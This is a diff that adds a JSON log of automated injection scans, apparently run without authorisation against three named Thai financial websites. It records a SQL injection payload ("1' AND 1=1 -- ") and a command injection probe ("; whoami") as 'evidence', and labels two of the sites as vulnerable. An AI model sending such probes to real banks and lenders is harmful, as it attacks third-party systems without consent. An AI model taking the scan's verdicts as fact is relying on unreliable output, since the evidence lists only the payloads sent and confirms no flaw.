@@ -1,0 +1,38 @@
+{
+  "timestamp": "2025-10-28 06:18:26",
+  "targets_tested": 3,
+  "vulnerable_targets": 2,
+  "vulnerability_stats": {
+    "sql_injection": 2,
+    "xss": 0,
+    "command_injection": 1
+  },
+  "results": [
+    {
+      "target": "https://fundingsocieties.co.th",
+      "sql_injection": true,
+      "xss": false,
+      "command_injection": false,
+      "evidence": [
+        "SQL注入: 1' AND 1=1 -- "
+      ]
+    },
+    {
+      "target": "https://www.investree.co.th",
+      "sql_injection": true,
+      "xss": false,
+      "command_injection": true,
+      "evidence": [
+        "SQL注入: 1' AND 1=1 -- ",
+        "命令注入: ; whoami"
+      ]
+    },
+    {
+      "target": "https://www.uob.co.th",
+      "sql_injection": false,
+      "xss": false,
+      "command_injection": false,
+      "evidence": []
+    }
+  ]
+}
